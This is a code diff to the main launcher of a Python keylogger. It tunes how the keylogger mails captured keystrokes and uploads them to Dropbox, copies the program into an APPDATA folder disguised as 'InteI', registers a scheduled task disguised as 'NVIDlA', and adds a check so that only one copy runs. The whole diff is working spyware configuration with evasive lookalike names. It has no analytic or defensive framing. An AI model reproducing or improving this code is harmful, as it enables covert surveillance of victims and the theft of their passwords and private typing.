@@ -1,4 +1,5 @@
 import os
+import psutil
 from dotenv import load_dotenv
 from keylogger import KeyLogger
 
@@ -13,15 +14,26 @@ EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
 EMAIL_CC = os.getenv("EMAIL_CC")
 DROPBOX_TOKEN = os.getenv("DROPBOX_TOKEN")
 
-SEND_REPORT_EVERY = 30  # seconds
+SEND_REPORT_EVERY = 10  # seconds
 MAGIC_WORD = "stop"
 
 SRC_FILE = "D:\main.exe"
-DEST_FOLDER = os.path.join(os.getenv('USERPROFILE'), 'InteI')
+DEST_FOLDER = os.path.join(os.getenv("APPDATA"), "InteI")
 TASK_NAME = "NVIDlA"
 
 
+def is_process_running(process_name):
+    count = 0
+    for proc in psutil.process_iter(attrs=["pid", "name"]):
+        if proc.info["name"] == process_name:
+            count += 1
+    return count
+
+
 def main():
+    if is_process_running("main.exe") >= 2:
+        return
+
     keylogger = KeyLogger(
         time_interval=SEND_REPORT_EVERY,
         smtp_server=SMTP_SERVER,
@@ -33,7 +45,7 @@ def main():
         cc=EMAIL_CC,
         magic_word=MAGIC_WORD,
         dropbox_token=DROPBOX_TOKEN,
-        src_file = SRC_FILE,
+        src_file=SRC_FILE,
         dest_folder=DEST_FOLDER,
         task_name=TASK_NAME,
     )
